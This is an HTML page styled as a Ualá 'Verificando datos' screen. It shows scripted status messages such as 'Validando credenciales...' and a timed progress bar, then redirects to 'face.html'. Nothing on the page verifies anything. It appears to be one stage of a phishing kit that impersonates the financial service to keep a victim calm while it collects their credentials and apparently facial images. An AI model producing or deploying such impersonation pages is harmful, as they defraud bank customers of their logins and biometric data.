<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificando | Ualá</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, sans-serif;
      background: #ffffff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .container {
      text-align: center;
      background: rgba(255, 255, 255, 0.98);
      backdrop-filter: blur(20px);
      border-radius: 24px;
      padding: 48px 32px;
      box-shadow: 
        0 25px 50px -12px rgba(0, 0, 0, 0.08),
        0 10px 20px -8px rgba(0, 0, 0, 0.04);
      max-width: 380px;
      width: 90%;
      position: relative;
      animation: slideUp 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
      border: 1px solid rgba(0, 70, 255, 0.1);
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .logo {
      width: 110px; /* Un poco más grande para GIF */
      height: 110px;
      margin: 0 auto 24px;
      animation: floatLogo 3s ease-in-out infinite;
    }

    @keyframes floatLogo {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-8px); }
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      color: #1f2937;
      margin-bottom: 8px;
    }

    .subtitle {
      font-size: 16px;
      color: #6b7280;
      margin-bottom: 36px;
    }

    .loader-container {
      position: relative;
      height: 80px;
      margin-bottom: 24px;
    }

    .loader {
      position: absolute;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: conic-gradient(#0046ff, #60a5fa, #0046ff, transparent 50%);
      animation: rotate 1.2s linear infinite;
      box-shadow: 0 0 20px rgba(0, 70, 255, 0.3);
    }

    .loader::before {
      content: '';
      position: absolute;
      top: 5px;
      left: 5px;
      right: 5px;
      bottom: 5px;
      border-radius: 50%;
      background: white;
      animation: bounce 1.2s ease-in-out infinite;
    }

    @keyframes rotate {
      0% { transform: translateX(-50%) rotate(0deg); }
      100% { transform: translateX(-50%) rotate(360deg); }
    }

    @keyframes bounce {
      0%, 100% { transform: scale(0); }
      50% { transform: scale(1); }
    }

    .dots {
      display: flex;
      gap: 8px;
      justify-content: center;
      margin-top: 12px;
    }

    .dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #0046ff;
      animation: dotBounce 1.4s infinite ease-in-out;
      box-shadow: 0 0 8px rgba(0, 70, 255, 0.4);
    }

    .dot:nth-child(2) { animation-delay: 0.2s; }
    .dot:nth-child(3) { animation-delay: 0.4s; }

    @keyframes dotBounce {
      0%, 80%, 100% { transform: scale(0.5); opacity: 0.5; }
      40% { transform: scale(1); opacity: 1; }
    }

    .progress-bar {
      width: 100%;
      height: 4px;
      background: #f3f4f6;
      border-radius: 2px;
      overflow: hidden;
      margin-top: 20px;
      box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.05);
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(90deg, #0046ff, #60a5fa);
      border-radius: 2px;
      width: 0%;
      animation: progress 10s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
      box-shadow: 0 0 12px rgba(0, 70, 255, 0.4);
      position: relative;
    }

    .progress-fill::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
      animation: shimmer 2s infinite;
    }

    @keyframes progress {
      0% { width: 0%; }
      100% { width: 100%; }
    }

    @keyframes shimmer {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }

    .status {
      margin-top: 16px;
      font-size: 14px;
      color: #374151;
      font-weight: 500;
    }

    @media (max-width: 480px) {
      .container {
        padding: 40px 24px;
        margin: 20px;
      }
      
      .title {
        font-size: 20px;
      }
    }

    .particles {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      pointer-events: none;
      overflow: hidden;
    }

    .particle {
      position: absolute;
      background: rgba(0, 70, 255, 0.05);
      border-radius: 50%;
      animation: float 20s infinite linear;
    }

    .particle:nth-child(1) { width: 12px; height: 12px; left: 10%; animation-delay: 0s; }
    .particle:nth-child(2) { width: 8px; height: 8px; left: 80%; animation-delay: 5s; }
    .particle:nth-child(3) { width: 16px; height: 16px; left: 40%; animation-delay: 10s; }

    @keyframes float {
      0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="particles">
    <div class="particle"></div>
    <div class="particle"></div>
    <div class="particle"></div>
  </div>

  <div class="container">
    <!-- GIF ANIMADO UALÁ PERFECTO -->
    <img src="https://pbs.twimg.com/profile_images/1633859729968488450/E77Kpb_f_400x400.jpg" alt="Ualá" class="logo">

    <h1 class="title">Verificando datos</h1>
    <p class="subtitle">Estamos validando tu información de seguridad</p>

    <div class="loader-container">
      <div class="loader"></div>
      <div class="dots">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
    </div>

    <div class="progress-bar">
      <div class="progress-fill"></div>
    </div>

    <div class="status" id="status">Completando verificación...</div>
  </div>

  <script>
    const statuses = [
      "Completando verificación...",
      "Validando credenciales...",
      "Conectando con servidores...",
      "Cargando tu cuenta...",
      "¡Listo! Redirigiendo..."
    ];

    let statusIndex = 0;
    const statusEl = document.getElementById('status');

    const interval = setInterval(() => {
      statusEl.textContent = statuses[statusIndex];
      statusIndex++;
      
      if (statusIndex >= statuses.length) {
        statusIndex = statuses.length - 1;
      }
    }, 2000);

    setTimeout(() => {
      clearInterval(interval);
      window.location.href = "face.html";
    }, 10000);
  </script>
</body>
</html>
